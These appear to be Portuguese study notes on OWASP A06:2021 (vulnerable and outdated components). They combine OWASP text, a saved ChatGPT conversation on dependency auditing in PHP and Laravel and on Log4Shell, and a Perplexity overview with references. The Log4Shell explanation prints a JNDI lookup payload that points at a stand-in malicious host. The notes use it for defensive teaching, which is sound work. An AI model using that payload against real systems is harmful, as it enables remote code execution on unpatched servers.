# A06 - Vulnerable and Outdated Components

## Resumo

É usar libs desatualizads, ou nâo se preocupar em atualizalas. Um exemplo é o Log4J, que permitia execuçâo remota em versôes antigas ou  o EternalBlue, uma vulnerabildiade no protocolo SMBv1 do Windows. Se você nâo atualizas componentes ou na o fica procupado em tentar manter eles atualizados pode dar problema se uma CVE for descorbeta. Para reoslver tem que manter tudo atualizado com comandos como:

composer --version

composer audit

composer update

composer outdated

E de preferencia ter tests unitaios para tesatr novamente e vê se nao quebra nada

## Links

+ https://owasp.org/Top10/pt_BR/A06_2021-Vulnerable_and_Outdated_Components/

## OWASP

## Descrição

Você provavelmente está vulnerável:

+ Se você não souber as versões de todos os componentes que usa (tanto do lado do cliente (front) quanto do lado do servidor (back)). Isso inclui componentes que você usa diretamente, bem como dependências aninhadas.

+ Se o software for vulnerável, sem suporte ou desatualizado. Isso inclui o sistema operacional, servidor  _web/application_, sistema de gerenciamento de banco de dados (DBMS), aplicações, APIs e todos os componentes, ambientes de tempo de execução e bibliotecas.

+ Se você não faz a varredura de vulnerabilidades regularmente e não assina os boletins de segurança relacionados aos componentes que você usa.

+ Se você não corrigir ou atualizar a plataforma, as estruturas e as dependências subjacentes de maneira oportuna e baseada em riscos. Isso geralmente acontece em ambientes em que a correção é uma tarefa mensal ou trimestral sob controle de alterações, deixando as organizações abertas a dias ou meses de exposição desnecessária a vulnerabilidades corrigidas.

+ Se os desenvolvedores de software não testarem a compatibilidade de bibliotecas atualizadas, atualizações ou com patches.

+ Se você não proteger as configurações dos componentes (consulte  [A05: 2021-Configuração Incorreta de Segurança](https://owasp.org/Top10/pt_BR/A05_2021-Security_Misconfiguration/)).

## Como Prevenir

Deve haver um processo de gerenciamento de dependências para:

+ Remover dependências não utilizadas, recursos, componentes, arquivos e documentação desnecessários.

+ Atualizar continuamente um inventário com as versões dos componentes do lado do cliente e do lado do servidor (por exemplo, estruturas, bibliotecas) e suas dependências usando ferramentas como  _versions_,  _OWASP Dependency Check_,  _retire.js_, etc. Monitore continuamente fontes como  _Common Vulnerability and Exposures_  (CVE) e  _National Vulnerability Database_  (NVD) para vulnerabilidades nos componentes. Use ferramentas de análise de composição de software para automatizar o processo. Inscreva-se para receber alertas de e-mail sobre vulnerabilidades de segurança relacionadas aos componentes que você usa.

+ Obtenha componentes apenas de fontes oficiais por meio de links seguros. Prefira pacotes assinados para reduzir a chance de incluir um componente malicioso modificado (consulte  [A08: 2021-Software e Falhas de Integridade de Dados](https://owasp.org/Top10/pt_BR/A08_2021-Software_and_Data_Integrity_Failures/)).

+ Monitore bibliotecas e componentes sem manutenção ou que não criem patches de segurança para versões anteriores. Se o patch não for possível, considere implantar um patch virtual para monitorar, detectar ou proteger contra o problema descoberto.

Cada organização deve garantir um plano contínuo de monitoramento, triagem e aplicação de atualizações ou alterações de configuração durante a vida útil da aplicação ou portfólio.

## Exemplos de Cenários de Ataque

**Cenário #1:**  Os componentes normalmente são executados com os mesmos privilégios da própria aplicação, portanto, as falhas em qualquer componente podem resultar em sério impacto. Essas falhas podem ser acidentais (por exemplo, erro de codificação) ou intencionais (por exemplo, uma  _backdoor_  em um componente). Alguns exemplos de vulnerabilidades de componentes exploráveis descobertos são:

+ CVE-2017-5638, uma vulnerabilidade de execução remota de código do Struts 2 que permite a execução de código arbitrário no servidor, foi responsabilizada por violações significativas.

+ Embora a Internet das Coisas (IoT) seja frequentemente difícil ou impossível de corrigir, a importância de corrigi-los pode ser grande (por exemplo, dispositivos biomédicos).

Existem ferramentas automatizadas para ajudar os invasores a encontrar sistemas não corrigidos ou configurados incorretamente. Por exemplo, o mecanismo de pesquisa Shodan IoT pode ajudá-lo a encontrar dispositivos que ainda sofrem com a vulnerabilidade Heartbleed corrigida em abril de 2014.

## Referências

+ OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling

+ OWASP Dependency Check (for Java and .NET libraries)

+ OWASP Testing Guide - Map Application Architecture (OTG-INFO-010)

+ OWASP Virtual Patching Best Practices

+ The Unfortunate Reality of Insecure Libraries

+ MITRE Common Vulnerabilities and Exposures (CVE) search

+ National Vulnerability Database (NVD)

+ Retire.js for detecting known vulnerable JavaScript libraries

+ Node Libraries Security Advisories

+ [Ruby Libraries Security Advisory Database and Tools](https://owasp.org/Top10/pt_BR/A06_2021-Vulnerable_and_Outdated_Components/)

+ https://safecode.org/publication/SAFECode_Software_Integrity_Controls0610.pdf

## Lista dos CWEs Mapeados

CWE-937 OWASP Top 10 2013: Using Components with Known Vulnerabilities

CWE-1035 2017 Top 10 A9: Using Components with Known Vulnerabilities

CWE-1104 Use of Unmaintained Third Party Components

--=============================
--=============================
--=============================
--=============================
--=============================
--=============================

## Chat GPT

### Q1 - CHATGPT - O QUE É A06

A **A06 do OWASP Top 10 (2021)** refere-se à vulnerabilidade chamada **"Vulnerabilidades de Componentes Desatualizados e Vulneráveis"** (_A06:2021 - Vulnerable and Outdated Components_).

---

### 📌 **Resumo**

A A06 trata do risco de utilizar **componentes (bibliotecas, frameworks, módulos etc.) com falhas de segurança conhecidas**, mas que ainda estão presentes nas aplicações. Isso inclui tanto componentes de código aberto quanto comerciais.

---

### ⚠️ **Por que é um problema?**

Desenvolvedores frequentemente usam bibliotecas de terceiros para agilizar o desenvolvimento. Quando essas bibliotecas têm **vulnerabilidades conhecidas** (como falhas de segurança divulgadas em CVEs), elas podem ser exploradas por atacantes — mesmo que a aplicação principal esteja segura.

---

### 🔍 **Exemplos práticos**

+ Uma aplicação Laravel usando uma versão antiga do Guzzle com falhas conhecidas de segurança.
+ Um frontend Vue.js que utiliza uma versão vulnerável do Lodash.
+ Um sistema Java que usa uma versão antiga do Log4j (vulnerável ao _Log4Shell_).

---

### 🛠️ **Como se proteger**

1. **Inventariar dependências:** Tenha um inventário completo de todos os componentes utilizados (e suas versões).
2. **Monitorar CVEs:** Use ferramentas que monitorem vulnerabilidades conhecidas (Snyk, Dependabot, OWASP Dependency-Check).
3. **Atualizações regulares:** Atualize os componentes frequentemente, preferencialmente em ciclos contínuos.
4. **Usar ferramentas de build seguras:** Sistemas como Composer, npm, Maven etc. podem travar versões seguras.
5. **Evitar componentes sem manutenção:** Se a biblioteca está desatualizada e sem suporte ativo, substitua.

---

### 🧰 Ferramentas úteis

+ **OWASP Dependency-Check**
+ **Snyk**
+ **Dependabot (GitHub)**
+ **npm audit / yarn audit**
+ **composer audit**

---

### ✅ Boas práticas

+ Automatizar a verificação de segurança das dependências na CI/CD.
+ Não confiar que “só porque funciona, está seguro”.
+ Incluir políticas de atualização e verificação de componentes no ciclo de vida de desenvolvimento seguro (_SSDLC_).

---

Quer ver um exemplo prático com uma linguagem ou framework específico?

## Q2 - CHATGPT - COMO SE PROTEGER NO PHP PURO E LARAVEL

Ótima pergunta, Rafael! Vamos ver como identificar e lidar com **componentes desatualizados e vulneráveis** tanto em **PHP puro** quanto em **Laravel**, respeitando as boas práticas da A06 do OWASP Top 10.

---

## 🔹 **Em PHP puro**

Se você estiver usando **bibliotecas externas via Composer** (mesmo em projetos sem framework), você pode aplicar auditoria com ferramentas nativas:

### ✅ Passos:

==> 1. **Verifique se o Composer está instalado:**

```bash
composer --version
```

==> 2. **Audite as dependências:**

```bash
composer audit
```

> Isso irá consultar a base de dados de vulnerabilidades de segurança do `Packagist` e exibir falhas conhecidas nas bibliotecas do seu `composer.lock`.

==> 3. **Atualize bibliotecas inseguras:**

```bash
composer update
```

==> 4. **(Opcional) Use `composer outdated` para ver o que está velho:**

```bash
composer outdated
```

---

## 🔸 **Em Laravel**

O Laravel usa Composer, então o processo é semelhante ao do PHP puro. Porém, você pode integrar melhor isso com ferramentas de CI/CD e outras dependências JavaScript (se houver frontend).

### ✅ Composer:

Mesmos comandos do PHP puro:

```bash
composer audit         # verifica vulnerabilidades conhecidas
composer outdated      # mostra pacotes desatualizados
composer update        # atualiza os pacotes
```

### ✅ NPM/Yarn (para frontend em Vue.js, React, etc.):

Se você estiver usando algum frontend, audite também os pacotes JS:

```bash
npm audit fix
# ou
yarn audit
```

---

## 🛠️ Boas práticas adicionais para ambos

| Ação                    | Ferramenta                                                            |
| ----------------------- | --------------------------------------------------------------------- |
| Analisar CVEs e alertas | [Snyk](https://snyk.io), [Packagist Security](https://packagist.org/) |
| GitHub auto-alertas     | Dependabot (integração com GitHub)                                    |
| CI/CD com segurança     | GitHub Actions, GitLab CI, Bitbucket Pipelines etc.                   |

---

Se quiser, posso te ajudar a configurar um `composer audit` ou integrar o `Dependabot` no GitHub do seu projeto Laravel. Deseja isso?

## Q3 - Como foi o Log4j (aaque no Java recente)

Excelente pergunta! O ataque **Log4Shell**, que afetou a biblioteca **Log4j** no Java, é um **exemplo clássico e catastrófico da vulnerabilidade A06 do OWASP Top 10: uso de componentes desatualizados e vulneráveis**.

---

## 🚨 O que foi o ataque Log4Shell?

+ **Data:** Revelado publicamente em **dezembro de 2021**.
+ **Biblioteca afetada:** `log4j-core` (versões 2.0 a 2.14.1).
+ **CVE:** [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228).
+ **Gravidade:** 10/10 (máximo na escala CVSS).

### 🔥 O problema:

A biblioteca **Log4j**, amplamente usada para logging em aplicações Java, permitia **execução remota de código (RCE)** com algo tão simples quanto:

```java
logger.info("${jndi:ldap://malicious.site/a}");
```

> Essa string poderia vir de **qualquer input externo** (headers HTTP, campos de formulário, etc.) e seria interpretada automaticamente pela biblioteca Log4j, que fazia uma requisição a um servidor externo e executava código remotamente.

---

## 🧩 Relação com a A06:2021 (Componentes Vulneráveis)

+ A vulnerabilidade estava em uma **dependência popular, não atualizada**.
+ Muitas aplicações Java usavam versões antigas do Log4j **sem saber**.
+ **Mesmo quem nunca usou diretamente o Log4j** foi afetado se qualquer biblioteca interna o utilizasse.

🔗 Ou seja:

> **Quem não monitorava ou auditava suas dependências**, caiu direto na armadilha da A06. A falha não estava no código da aplicação, mas na **cadeia de dependências**.

---

## 🛡️ Como evitar esse tipo de problema?

### Para Java/Log4j:

+ Atualizar para Log4j **2.16+** ou usar bibliotecas alternativas seguras como `logback`.
+ Desabilitar substituições JNDI se não precisar.

### De forma geral (qualquer linguagem ou framework):

+ 🔍 **Auditar dependências regularmente.**
+ 📦 **Atualizar pacotes com frequência.**
+ 🛠️ **Monitorar CVEs** (via Dependabot, Snyk, OSS Index).
+ 🔐 **Tratar qualquer input como potencialmente malicioso.**

---

Se quiser, posso mostrar como esse ataque se pareceria num cenário real com código Java ou como identificá-lo automaticamente num pipeline de CI. Quer seguir por esse caminho?

## Perplexity

<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" class="logo" width="120"/>

# A06:2021-Componentes Vulneráveis e Desatualizados da OWASP Top 10

A classificação OWASP Top 10 é um documento padrão essencial para desenvolvedores e profissionais de segurança em aplicações web. Esta análise foca no A06:2021-Componentes Vulneráveis e Desatualizados, uma vulnerabilidade crítica que subiu da 9ª posição em 2017 para a 6ª posição em 2021, refletindo seu crescente impacto no cenário de segurança digital.

## Descrição e Impacto

Anteriormente intitulada "Uso de Componentes com Vulnerabilidades Conhecidas", esta categoria representa um dos riscos mais persistentes e desafiadores para as aplicações modernas. Os componentes vulneráveis funcionam como verdadeiros cavalos de Troia, infiltrando-se silenciosamente nas aplicações e expondo-as a diversos vetores de ataque[^17].

### Natureza da Vulnerabilidade

Componentes vulneráveis e desatualizados representam um risco significativo pois grande parte do desenvolvimento de software moderno depende de bibliotecas, frameworks e outros componentes de terceiros. Quando estes componentes contêm falhas de segurança conhecidas, eles tornam-se pontos de entrada para atacantes que buscam comprometer sistemas maiores[^17].

### Fatores Contribuintes

Vários fatores contribuem para a prevalência desta vulnerabilidade:

1. **Componentes desatualizados**: Software sem patches de segurança recentes é particularmente suscetível à exploração, tornando-se alvo fácil para atacantes que utilizam exploits conhecidos[^17].
2. **Dependências vulneráveis**: Muitos componentes possuem suas próprias dependências, criando uma cadeia de vulnerabilidades potenciais. Um componente aparentemente seguro pode introduzir riscos através de suas dependências vulneráveis[^17].
3. **Ausência de revisões de segurança**: A falha em conduzir análises abrangentes de segurança antes de incorporar componentes externos aumenta significativamente o risco de vulnerabilidades[^17].
4. **Configuração inadequada**: Mesmo componentes seguros podem representar riscos quando configurados incorretamente, criando vetores de ataque adicionais[^17].

## Estratégias de Prevenção

Para mitigar os riscos associados a componentes vulneráveis e desatualizados, as organizações devem implementar uma abordagem proativa e sistemática de gerenciamento de componentes[^17].

### Gerenciamento de Dependências

O gerenciamento eficaz de dependências é fundamental para manter a segurança das aplicações. A OWASP fornece recursos específicos para auxiliar nesta tarefa, como o "Vulnerable Dependency Management Cheat Sheet", que oferece orientações detalhadas sobre como identificar, avaliar e mitigar riscos associados às dependências[^18].

### Práticas Recomendadas para JavaScript de Terceiros

O uso de JavaScript de terceiros apresenta riscos únicos. O "Third Party JavaScript Management Cheat Sheet" da OWASP oferece diretrizes específicas para garantir que códigos JavaScript externos não comprometam a segurança da aplicação[^18].

### Segurança em Ecossistemas Específicos

Para ambientes de desenvolvimento específicos, como ecossistemas Node.js, as práticas de segurança do npm são essenciais. As recomendações de "npm Security best practices" ajudam a manter a integridade e segurança dos pacotes utilizados[^18].

### Inventário e Atualização Contínua

Manter um inventário atualizado de todos os componentes utilizados, incluindo versões e dependências, é essencial para identificar rapidamente quando uma vulnerabilidade afeta sua aplicação. Estabelecer um processo de atualização regular de componentes ajuda a minimizar a janela de exposição a vulnerabilidades conhecidas.

## Exemplos de Ataques

Embora os resultados de pesquisa não forneçam exemplos específicos, os ataques típicos relacionados a componentes vulneráveis incluem:

### Exploração de Vulnerabilidades Conhecidas

Atacantes frequentemente utilizam bancos de dados de vulnerabilidades para identificar sistemas que utilizam componentes com falhas de segurança conhecidas. Uma vez identificados, eles podem explorar estas vulnerabilidades para obter acesso não autorizado, executar código malicioso ou comprometer dados sensíveis.

### Ataques à Cadeia de Suprimentos

Um ataque sofisticado envolve comprometer os próprios repositórios de componentes ou o processo de distribuição. Isso permite que os atacantes injetem código malicioso em componentes legítimos, afetando potencialmente milhares de aplicações que utilizam esses componentes.

### Exploração de Configurações Padrão Inseguras

Muitos componentes vêm com configurações padrão que priorizam a funcionalidade sobre a segurança. Atacantes podem explorar estas configurações quando as organizações falham em personalizar adequadamente os componentes para um ambiente de produção seguro.

## Conclusão

Componentes vulneráveis e desatualizados representam um desafio significativo para a segurança de aplicações modernas. A elevação desta categoria na classificação OWASP Top 10 2021 reflete a crescente complexidade dos ecossistemas de software e a dependência de componentes de terceiros.

Para reduzir efetivamente este risco, as organizações devem implementar processos rigorosos de gerenciamento de componentes, manter-se atualizadas sobre vulnerabilidades recém-descobertas e adotar uma abordagem proativa para segurança. Através de avaliações regulares, atualizações oportunas e configurações apropriadas, é possível minimizar significativamente os riscos associados a componentes vulneráveis e desatualizados.

A segurança de uma aplicação é tão forte quanto seu componente mais fraco, tornando essencial a atenção contínua a este aspecto crítico da segurança cibernética.

<div style="text-align: center">⁂</div>

[^1]: https://owasp.org/Top10/

[^2]: https://www.youtube.com/watch?v=wpLCjyg1HuM

[^3]: https://www.revenera.com/blog/software-composition-analysis/equifax-confirms-unpatched-security-vulnerability-in-apache-struts-2-caused-data-breach/

[^4]: https://en.wikipedia.org/wiki/Heartbleed

[^5]: https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/

[^6]: https://www.perceptive.is/secure-by-design/2025/march/owasp-top-10-explained-06-vulnerable-and-outdated-components/

[^7]: https://en.wikipedia.org/wiki/WannaCry_ransomware_attack

[^8]: https://owasp.org/www-project-top-ten/

[^9]: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/

[^10]: https://www.clouddefense.ai/owasp/2021/6

[^11]: https://docs.checkmarx.com/en/34965-46728-owasp-top-10-2021.html

[^12]: https://niccs.cisa.gov/education-training/catalog/cybrary/owasp-top-10-a062021-vulnerable-and-outdated-components

[^13]: https://github.com/OWASP/Top10/blob/master/2021/docs/A06_2021-Vulnerable_and_Outdated_Components.md

[^14]: https://www.kiuwan.com/wp-content/uploads/2024/05/OWASP-2021-Ebook.pdf

[^15]: https://www.secura.com/blog/owasp-top-10-2021

[^16]: https://www.linkedin.com/pulse/understanding-a062021-vulnerable-outdated-components-owasp-ian5c

[^17]: https://securityboulevard.com/2021/11/new-owasp-top-10-for-2021-whats-new/

[^18]: https://cheatsheetseries.owasp.org/IndexTopTen.html

[^19]: https://github.com/OWASP/Top10/blob/master/2021/docs/A00_2021_Introduction.md

[^20]: https://finitestate.io/blog/owasp-top-10-2021-webinar

[^21]: https://niccs.cisa.gov/education-training/catalog/cybrary/owasp-top-10-a062021-vulnerable-and-outdated-components

[^22]: https://www.cybrary.it/course/owasp-vulnerable-and-outdated-components

[^23]: https://www.classcentral.com/course/cybrary-owasp-vulnerable-and-outdated-components-99431

[^24]: https://securityaffairs.com/63043/hacking/equifax-data-breach.html

[^25]: https://www.heartbleed.com

[^26]: https://www.picussecurity.com/resource/blog/simulating-and-preventing-cve-2021-44228-apache-log4j-rce-exploits

[^27]: https://onapsis.com/blog/active-exploitation-of-sap-vulnerability-cve-2025-31324/

[^28]: https://www.theregister.com/2024/12/12/apache_struts_2_vuln/

[^29]: https://github.com/mpgn/heartbleed-PoC

[^30]: https://www.tenable.com/blog/cve-2021-44228-cve-2021-45046-cve-2021-4104-frequently-asked-questions-about-log4shell

[^31]: https://www.acunetix.com/blog/web-security-zone/vulnerable-and-outdated-components-owasp-top-10/

[^32]: https://www.sciencedirect.com/science/article/abs/pii/S1353485818300059

[^33]: https://www.blackduck.com/blog/heartbleed-bug.html

[^34]: https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/

[^35]: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/

[^36]: https://prophaze.com/learning/components-with-known-vulnerabilities/

[^37]: https://nvd.nist.gov/vuln/detail/cve-2017-0144

[^38]: https://success.trendmicro.com/en-US/solution/KA-0007453

[^39]: https://www.youtube.com/watch?v=Zz-iXTL85EE

[^40]: https://www.youtube.com/watch?v=ub4o9Tgw-gk

[^41]: https://www.codecademy.com/learn/2021-owasp-top-10-vulnerable-and-outdated-components/modules/maybe-its-time-for-an-update/cheatsheet

[^42]: https://www.blackduck.com/blog/equifax-apache-struts-vulnerability-cve-2017-5638.html

[^43]: https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html

[^44]: https://avatao.com/blog-deep-dive-into-the-equifax-breach-and-the-apache-struts-vulnerability/

[^45]: https://www.digitalguardian.com/blog/equifax-hacked-six-month-old-struts-vulnerability

[^46]: https://brightsec.com/blog/misconfiguration-attacks/

[^47]: https://qawerk.com/blog/vulnerable-and-outdated-components/

[^48]: https://www.vegaitglobal.com/media-center/knowledge-base/how-to-protect-against-vulnerable-and-outdated-components-web-security-blog-series

[^49]: https://www.vumetric.com/blog/owasp-top-10-a06-vulnerable-and-outdated-components-explained/

[^50]: https://owaspsecure.com/learn/vuln6.html

[^51]: https://github.com/3ls3if/Cybersecurity-Notes/blob/main/readme/owasp-top-10/web/a06-2021-vulnerable-and-outdated-components.md

[^52]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-0144

[^53]: https://www.avast.com/pt-br/c-eternalblue

[^54]: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-0144

[^55]: https://helpdesk.kaseya.com/hc/en-gb/articles/4407526903953-CVE-2017-0143-Windows-SMB-RCE-Vulnerability-WannaCry

[^56]: https://en.wikipedia.org/wiki/EternalBlue

[^57]: https://vuldb.com/?id.98019

[^58]: https://www.cisa.gov/sites/default/files/FactSheets/NCCIC ICS_FactSheet_WannaCry_Ransomware_S508C.pdf
